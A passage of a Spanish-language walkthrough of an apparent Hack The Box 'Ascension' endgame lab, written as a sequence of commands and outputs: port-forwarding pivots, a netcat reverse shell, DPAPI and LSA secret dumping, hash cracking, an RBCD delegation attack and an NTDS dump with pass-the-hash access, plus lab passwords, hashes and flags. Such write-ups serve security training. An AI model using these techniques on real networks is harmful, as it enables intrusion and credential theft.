+<p class="plain-text">Para poder enviarnos una revshell usaremos <code class="language-plaintext highlighter-rouge">netsh</code> para redirigir el trafico en el puerto <code class="language-plaintext highlighter-rouge">4444</code> del <code class="language-plaintext highlighter-rouge">DC1</code> a <code class="language-plaintext highlighter-rouge">WEB01</code> y de WEB01 a nuestro equipo por el mismo puerto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">netsh </span><span class="p">interface portproxy add v4tov4 listenaddress=192.168.11.6 listenport=4444 connectaddress=192.168.10.39 connectport=4444  
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\Administrator\Documents&gt; </span><span class="am">netsh </span><span class="p">interface portproxy add v4tov4 listenaddress=192.168.10.39 listenport=4444 connectaddress=10.10.14.10 connectport=4444  
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente en la web ejecutamos el <code class="language-plaintext highlighter-rouge">netcat.exe</code> para que envie una <code class="language-plaintext highlighter-rouge">powershell</code> a <code class="language-plaintext highlighter-rouge">DC1</code> que despues de redirigir el trafico la enviara a nuestro equipo atacante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">cmd /c C:\ProgramData\netcat.exe -e powershell 192.168.11.6 4444  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos una <code class="language-plaintext highlighter-rouge">powershell</code> como el usuario <code class="language-plaintext highlighter-rouge">elliot</code> en el equipo <code class="language-plaintext highlighter-rouge">MS01</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ netcat </span><span class="p">-lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.13.38.20
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Users\elliot&gt; </span><span class="am">whoami</span><span class="p">
+megaairline\elliot
+PS C:\Users\elliot&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el directorio de descargas podemos encontrar el instlador de <code class="language-plaintext highlighter-rouge">Slack</code>, esto realmente es una pequeña pista ya que despues de enumerar podemos encontrar dentro de <code class="language-plaintext highlighter-rouge">Chrome</code> una db con el nombre <code class="language-plaintext highlighter-rouge">7</code> que copiaremos a <code class="language-plaintext highlighter-rouge">C:\ProgramData</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\elliot\Downloads&gt; </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\elliot\Downloads
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/16/2020   8:00 AM       83040752 SlackSetup.exe  
+
+PS C:\Users\elliot\Downloads&gt;</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00&gt; </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a----       10/16/2020   9:28 AM         170673 7                             
+
+PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00&gt; </span><span class="am">cp </span><span class="p">7 C:\ProgramData  
+PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar <a href="https://www.powershellgallery.com/packages/PowerSploit/1.0.0.0/Content/ReverseEngineering%5CGet-Strings.ps1">Get-Strings</a> para buscar cadenas de texto, la ultima linea llama la atencion ya que habla de <code class="language-plaintext highlighter-rouge">elliot</code> como cuenta <code class="language-plaintext highlighter-rouge">admin</code> y nos da una contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">Import-Module </span><span class="p">.\Get-Strings.ps1
+PS C:\ProgramData&gt; </span><span class="am">Get-Strings </span><span class="p">7 | </span><span class="am">Select-String </span><span class="p">password
+
+needs_initial_password_setF"
+text"6local account username: elliot password: LetMeInAgain!{
+text"6local account username: elliot password: LetMeInAgain!"
+text"!MS01 admin account and password: {
+text";MS01 admin account and password: ```elliot LetMeInAgain!```"  
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando los administradores locales si que encontramos a <code class="language-plaintext highlighter-rouge">elliot</code> pero a nivel local y no de <code class="language-plaintext highlighter-rouge">dominio</code> asi que aunque somos el usuario elliot no nos servira de nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">net </span><span class="p">localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain  
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+elliot
+MEGAAIRLINE\Domain Admins
+The command completed successfully.
+
+PS C:\ProgramData&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al probar la contraseña que encontramos para el usuario <code class="language-plaintext highlighter-rouge">elliot</code> nos devuelve que es valida a nivel <code class="language-plaintext highlighter-rouge">local</code>, sin embargo no un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> como se esperaria de primeras</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb ms01.megaairline.local -u elliot -p LetMeInAgain! --local-auth 
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="ve">[+] </span><span class="p">MS01\elliot:LetMeInAgain!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El servicio <code class="language-plaintext highlighter-rouge">RDP</code> esta abierto asi que podemos simplemente conectarnos y dentro abrir una <code class="language-plaintext highlighter-rouge">cmd</code>, donde tenemos privilegios de admin y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ xfreerdp </span><span class="p">/u:elliot /p:LetMeInAgain! /v:ms01.megaairline.local /dynamic-resolution /cert:ignore  </span>
+</code></pre></div></div><br>
+
+<a href="/endgames/ascension/18.png" target="_blank"><div><p><img src="/endgames/ascension/18.png"></p></div></a>
+
+<p class="plain-text">Nuevamente usaremos <a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a> donde logramos encontrar la contraseña del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> en <code class="language-plaintext highlighter-rouge">MS01</code> probablemente solo de manera local</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\elliot.MS01\Desktop&gt; </span><span class="am">curl </span><span class="p">192.168.11.6/SharpDPAPI.exe </span><span class="c1">-o </span><span class="p">SharpDPAPI.exe
+PS C:\Users\elliot.MS01\Desktop&gt; </span><span class="am">.\SharpDPAPI.exe </span><span class="p">machinetriage
+
+  __                 _   _       _ ___
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                |
+  v1.11.3
+
+
+[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage
+
+[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+[*] RevertToSelf()
+
+[*] Secret  : DPAPI_SYSTEM
+[*]    full: 487772FBFFEDCCD08B08239AF25F7C42A0C2AB7636CBEDE3241336B34893574F96C27A7411F18A6C
+[*]    m/u : 487772FBFFEDCCD08B08239AF25F7C42A0C2AB76 / 36CBEDE3241336B34893574F96C27A7411F18A6C  
+
+[*] SYSTEM master key cache:
+
+{236ba6f2-6d51-4312-beb2-365eb2897601}:E9AB8AB7568ABEEA751B1D5B4A8C14A682DE5CC4
+{6af669bc-5e57-413c-ba26-6d63fb62c794}:78EF352E05532ADF635D9AFEEC839B96E99601A6
+{b88476d3-b611-4e16-be7f-8525fb5dcd4f}:14F7A4B882D7D01EDF4C9015E10868649F58D159
+{bd0e6c0c-1301-4c56-90f0-4dd4504dc8ce}:F2FBB1F90F09F29D7B20D4366BCE33C9B439CC81
+{c21c474c-ad42-425f-babf-623340194247}:451EE9B8011CEF62A3404F44A64B2ACD93CD9FDB
+{360b584f-7027-4f23-85ad-b13720f57979}:58B9072F514E39AB9036140775FA34FE852924E4
+{b0724227-4609-4b11-81ad-4694b3e3e947}:C5CCE9487809C753C814848080BF1DD16985B509
+{e85f73ce-4638-49bf-a1b2-984e0be4890b}:1C834ECB6C3DC3502001A4974DDF46E01141FDDF
+{f52cb0ce-0f39-422a-bff2-68b49e60beb5}:11D1FB8FB59C7E18C8600959C13DF23FE22C8ADE
+
+[*] Triaging System Credentials
+
+Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+  CredFile           : 7E6A4CF66305FBFB5B060CD27A723F46
+
+    guidMasterKey    : {360b584f-7027-4f23-85ad-b13720f57979}
+    size             : 576
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    LastWritten      : 10/14/2020 10:33:07 AM
+    TargetName       : Domain:batch=TaskScheduler:Task:{A7499C51-AB7C-44BF-9314-6A305239E450}
+    TargetAlias      :
+    Comment          :
+    UserName         : MS01\Administrator
+    Credential       : FWErfsgt4ghd7f6dwx
+
+PS C:\Users\elliot.MS01\Desktop&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobando la contraseña con <code class="language-plaintext highlighter-rouge">crackmapexec</code> localmente nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code> asi que podemos conectar con <code class="language-plaintext highlighter-rouge">wmiexec</code> y obtener una powershell como este usuario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb ms01.megaairline.local -u Administrator -p FWErfsgt4ghd7f6dwx --local-auth
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="ve">[+] </span><span class="p">MS01\Administrator:FWErfsgt4ghd7f6dwx </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-wmiexec </span><span class="p">WORKGROUP/Administrator:FWErfsgt4ghd7f6dwx@ms01.megaairline.local -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\&gt; </span><span class="am">whoami</span><span class="p">
+ms01\administrator
+
+PS C:\&gt; </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+ASCENSION{sL4ck1ng_0n_enCrypt1oN}
+
+PS C:\&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag7">
+<br><h3 class="post-title">Maverick</h3>
+<h4 class="post-title">ASCENSION{g0t_a1L_7h3_ac3s}</h4><br>
+
+<p class="plain-text">Al dumpear los secretos <code class="language-plaintext highlighter-rouge">lsa</code> de este equipo nos encontramos con algunos hashes en formato <code class="language-plaintext highlighter-rouge">mscash2</code>, uno pertenece a un usuario que aun no tenemos y es <code class="language-plaintext highlighter-rouge">anna</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb ms01.megaairline.local -u Administrator -p FWErfsgt4ghd7f6dwx --local-auth --lsa
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="ve">[+] </span><span class="p">MS01\Administrator:FWErfsgt4ghd7f6dwx </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="ve">[+] </span><span class="p">Dumping LSA secrets
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2021-06-09 12:56:43)
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE.LOCAL/elliot:$DCC2$10240#elliot#1985a8159434672943be0d4f94cea4b2: (2020-10-16 15:54:05)
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE.LOCAL/anna:$DCC2$10240#anna#beff6c5d84183e72d1ef69f18051ed49: (2020-10-14 14:54:00)
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE\MS01$:aes256-cts-hmac-sha1-96:a134ed2a75cbd3ff0be93c11d979fecd5cf81ff7c9194b8eea3c368efb5d8b3c
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE\MS01$:aes128-cts-hmac-sha1-96:a271a2cc8d68a84c3ee70450a976bfdc
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE\MS01$:des-cbc-md5:c76e529e62c28ae0
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE\MS01$:plain_password_hex:40e0e091a87bcb8ef7b8d715da6ebe499ab5fa7494a3d2c4f704a871f131ab5908d97abde6ef23214fd85d209067b0dc14b606407308a6fd5e190c465f91868de51efc531baae61087b2ad4fd5509433c3f9c648e130e4e3680f49acd3d94804a3d7437f859997d11ed885f8af3f937842004b7dfca47a2ac977534a4244bfcfa2fa73bd0cbf3618c54aff2e17fd54b7ad270c9c1c9c4f68277a19b8885a1d53cfa5f1e43e7f1bacfabcb6b2a8fa570bbe2310365d9b49aedf48c660cddf166f145ac7a9a72b584849ec7605719c3f71d0d132ab3824fac0db227a859af2148dbbd551824133acd775119b5b86c3d9ca  
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">MEGAAIRLINE\MS01$:aad3b435b51404eeaad3b435b51404ee:1a60da9a2479af44780749249ed6248f:::
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">dpapi_machinekey:0x487772fbffedccd08b08239af25f7c42a0c2ab76
+</span><span class="am">dpapi_userkey:0x36cbede3241336b34893574f96c27a7411f18a6c
+</span><span class="az">SMB         </span><span class="p">ms01.megaairline.local 445    MS01             </span><span class="am">NL$KM:33eb2a1da2aff443ecaf9f474df4857987a84e71648fd00f94e3041305cdda929bd1eb02ea266e4b0e77996a29737c20d1767bb63e7f42cf108aaa01d849883d</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">rockyou.txt</code> no nos ayudara en este caso, pero al probar con contraseñas que tenemos del mismo lab, anna reutiliza la contraseña de <code class="language-plaintext highlighter-rouge">Administrator</code> en MS01</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ john </span><span class="p">-w:passwords hashes
+Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
+Use the "--format=HMAC-MD5" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 1 candidate left, minimum 16 needed for performance.
+</span><span class="am">FWErfsgt4ghd7f6dwx</span><span class="p"> (</span><span class="am">MEGAAIRLINE.LOCAL/anna</span><span class="p">)
+Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos las credenciales con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y son validas a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc2.megaairline.local -u anna -p FWErfsgt4ghd7f6dwx
+</span><span class="az">SMB         </span><span class="p">megaairline.local 445    DC2              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">megaairline.local 445    DC2              </span><span class="ve">[+] </span><span class="p">megaairline.local\anna:FWErfsgt4ghd7f6dwx</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para enumerar el dominio igual que antes usaremos <code class="language-plaintext highlighter-rouge">bloodhound</code>, nos autenticaremos con las credenciales de <code class="language-plaintext highlighter-rouge">anna</code> y toda la informacion la guardamos en un <code class="language-plaintext highlighter-rouge">zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ bloodhound-python </span><span class="p">-u anna -p FWErfsgt4ghd7f6dwx -ns 192.168.11.201 -d megaairline.local -c All --zip  
+INFO: Found AD domain: megaairline.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc2.megaairline.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 4 computers
+INFO: Connecting to LDAP server: dc2.megaairline.local
+INFO: Found 12 users
+INFO: Connecting to GC LDAP server: dc2.megaairline.local
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: MS01.megaairline.local
+INFO: Querying computer: DC2.megaairline.local
+INFO: Done in 00M 33S
+INFO: Compressing output into 20230901014306_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de subir el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code>, enumeramos partiendo del usuario <code class="language-plaintext highlighter-rouge">anna</code> y nos encontramos con que tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el equipo <code class="language-plaintext highlighter-rouge">DC2</code> por lo que podriamos explotarlo facilmente mediante un ataque <code class="language-plaintext highlighter-rouge">RBCD</code> hacia el DC2</p>
+<a href="/endgames/ascension/20.png" target="_blank"><div><p><img src="/endgames/ascension/20.png"></p></div></a>
+
+<p class="plain-text">Este tipo de ataque <code class="language-plaintext highlighter-rouge">RBCD</code> se puede hacer facilmente con las herramientas <code class="language-plaintext highlighter-rouge">impacket</code>, creando la cuenta de equipo con <code class="language-plaintext highlighter-rouge">addcomputer</code> y hacer la delegacion con <code class="language-plaintext highlighter-rouge">rbcd</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-addcomputer </span><span class="p">-computer-name attackersystem$ -computer-pass 123456 megaairline.local/anna:FWErfsgt4ghd7f6dwx
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Successfully added machine account attackersystem$ with password 123456.
+
+</span><span class="ve">❯ impacket-rbcd </span><span class="p">-delegate-from attackersystem$ -delegate-to DC2$ -action write megaairline.local/anna:FWErfsgt4ghd7f6dwx  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] attackersystem$ can now impersonate users on DC2$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     attackersystem$   (S-1-5-21-775547830-308377188-957446042-9104)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de hacer la delegacion solo nos queda solicitar un <code class="language-plaintext highlighter-rouge">ticket</code> autenticandonos como el equipo creado <code class="language-plaintext highlighter-rouge">attackersystem</code> suplantando al usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-getST </span><span class="p">-spn cifs/dc2.megaairline.local megaairline.local/</span><span class="am">'attackersystem$'</span><span class="p">:123456 -impersonate Administrator  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con este ticket podriamos autenticarnos con el y conectarnos al DC con <code class="language-plaintext highlighter-rouge">wmiexec</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-wmiexec </span><span class="p">dc2.megaairline.local -k -no-pass -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\&gt; </span><span class="am">whoami</span><span class="p">
+megaairline\administrator
+
+PS C:\&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">O para mas comodidad con <code class="language-plaintext highlighter-rouge">crackmapexec</code> dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> y asi poder ver los hashes en formato <code class="language-plaintext highlighter-rouge">NT</code> de todos los usuarios y equipos asociados a este <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ crackmapexec </span><span class="p">smb dc2.megaairline.local -k --use-kcache --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="ve">[+] </span><span class="p">megaairline.local\Administrator from ccache </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:674f1a5c73f4faad8ddbf7f3bf86db60:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a3a4a21b530fcfafb9e4ae8a97d001d:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\elliot:1108:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\anna:2101:aad3b435b51404eeaad3b435b51404ee:78350c7b3c5fe865d954d5b47013e21f:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\thomas:2601:aad3b435b51404eeaad3b435b51404ee:f639889cc1edee80e4469d0cb118be53:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\pippa:2602:aad3b435b51404eeaad3b435b51404ee:f5b43ca4ad68bce5349f7cb4b3168e4e:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\angela:2603:aad3b435b51404eeaad3b435b51404ee:df36ca14e6d8a3d06b2c895895dbf48a:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\nigel:2604:aad3b435b51404eeaad3b435b51404ee:923ef4c82666a2116ac5deda0a6b2e52:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\kate:2605:aad3b435b51404eeaad3b435b51404ee:805caf15ba4486fa23aeb1752503add2:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\emily:2606:aad3b435b51404eeaad3b435b51404ee:24bfa93d0525c9f374467224de523a6f:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">DC2$:1000:aad3b435b51404eeaad3b435b51404ee:cdfd67901176f6168d325d9ee3919e82:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">MS01$:1106:aad3b435b51404eeaad3b435b51404ee:1a60da9a2479af44780749249ed6248f:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">attackersystem$:9104:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">DAEDALUS$:1107:aad3b435b51404eeaad3b435b51404ee:680a37bc4b11bc76657bc23341beffd6:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con el hash NT de <code class="language-plaintext highlighter-rouge">Administrator</code> simplemente podriamos conectarnos al <code class="language-plaintext highlighter-rouge">DC2</code> usando <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> donde podemos leer la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm </span><span class="p">-i dc2.megaairline.local -u Administrator -H 674f1a5c73f4faad8ddbf7f3bf86db60  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+megaairline\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+ASCENSION{g0t_a1L_7h3_ac3s}
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra1">
+<br><h3 class="post-title">Extra 1</h3>
+<h4 class="post-title">CredEnum - Administrator WEB01</h4><br>
+
+<p class="plain-text">Volviendo a la primera shell que teniamos si con <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> enumeramos credenciales encontramos la contraseña de <code class="language-plaintext highlighter-rouge">sa</code> probablemente para conectarse a <code class="language-plaintext highlighter-rouge">mssql</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">.\Seatbelt.exe </span><span class="p">credenum
+
+
+                        %&amp;&amp;@@@&amp;&amp;                                                                                  
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%                         
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%  
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((  
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((  
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((  
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((  
+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####  
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####  
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################                        
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*                         
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.2.1         ,(((&amp;%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,                                                                                 
+
+====== CredEnum ======
+
+  Target              : Microsoft:SSMS:18:WEB01:sa:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
+  UserName            : sa
+  Password            : MySAisL33TM4n
+  CredentialType      : Generic
+  PersistenceType     : LocalComputer
+  LastWriteTime       : 4/2/2021 7:11:52 AM
+
+  Target              : Microsoft:SSMS:18:::00000000-0000-0000-0000-000000000000:0
+  UserName            : 
+  Password            : 
